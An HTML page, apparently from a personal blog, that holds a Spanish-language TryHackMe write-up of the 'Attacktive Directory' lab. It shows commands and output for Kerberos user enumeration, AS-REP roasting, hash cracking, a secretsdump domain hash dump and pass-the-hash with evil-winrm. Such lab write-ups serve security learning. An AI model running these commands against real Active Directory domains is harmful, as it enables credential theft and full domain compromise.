@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - Attacktive Directory | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-secondary">Windows</span>
+        <span class="badge bg-secondary">Active Directory</span>
+        <span class="badge bg-secondary">Kerberos</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Attacktive Directory</h1>
+      <p class="text-secondary mb-3">Enumeración y ataque a un entorno Active Directory. Kerberoasting, AS-REP Roasting y Pass-the-Hash contra el dominio <code>spookysec.local</code>.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> Jul 2022</span>
+        <span><i class="bi bi-clock"></i> ~90 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">kerbrute</span>
+        <span class="badge bg-dark border border-secondary p-2">impacket</span>
+        <span class="badge bg-dark border border-secondary p-2">hashcat</span>
+        <span class="badge bg-dark border border-secondary p-2">evil-winrm</span>
+        <span class="badge bg-dark border border-secondary p-2">secretsdump</span>
+      </div>
+    </div>
+
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+      <p class="text-secondary">Escaneo de puertos revela un entorno Windows AD completo con Kerberos, LDAP, SMB y RDP.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p53,80,88,135,139,389,445,3268,3389,5985 -Pn 10.10.241.225</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: spookysec.local)
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI (WinRM)</code></pre>
+      </div>
+      <p class="text-secondary">Enumeramos usuarios del dominio con Kerbrute:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>kerbrute userenum --dc 10.10.241.225 -d spookysec.local userlist.txt</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>[+] VALID USERNAME: james@spookysec.local
+[+] VALID USERNAME: svc-admin@spookysec.local
+[+] VALID USERNAME: administrator@spookysec.local</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> AS-REP Roasting</h4>
+      <p class="text-secondary">Buscamos cuentas con <code>DONT_REQUIRE_PREAUTH</code> para obtener hashes sin autenticación.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python3 GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -dc-ip 10.10.241.225 -no-pass</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:hash...</code></pre>
+      </div>
+      <p class="text-secondary">Crackeamos el hash con hashcat:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>hashcat -m 18200 hash.txt passwordlist.txt --force</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...<span class="text-danger fw-bold">:management2005</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada — Secretsdump & Pass-the-Hash</h4>
+      <p class="text-secondary">Con las credenciales de <code>svc-admin</code> dumpeamos los hashes NTLM de todo el dominio:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python3 secretsdump.py -just-dc spookysec.local/svc-admin:management2005@10.10.241.225</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="text-danger">hash_ntlm</span>:::</code></pre>
+      </div>
+      <p class="text-secondary">Pass-the-Hash con Evil-WinRM:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>evil-winrm -i 10.10.241.225 -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>Evil-WinRM shell v3.4
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+<span class="text-danger fw-bold">thm-ad\administrator</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>AS-REP Roasting es efectivo contra cuentas de servicio con Kerberos pre-auth deshabilitado.</li>
+        <li><code>secretsdump.py</code> de Impacket permite obtener todos los hashes del dominio con solo una cuenta privilegiada.</li>
+        <li>Pass-the-Hash funciona contra WinRM cuando el hash NTLM del Administrator está disponible.</li>
+        <li>Las cuentas de servicio (<code>svc-*</code>) suelen tener configuraciones débiles — siempre enumerarlas.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
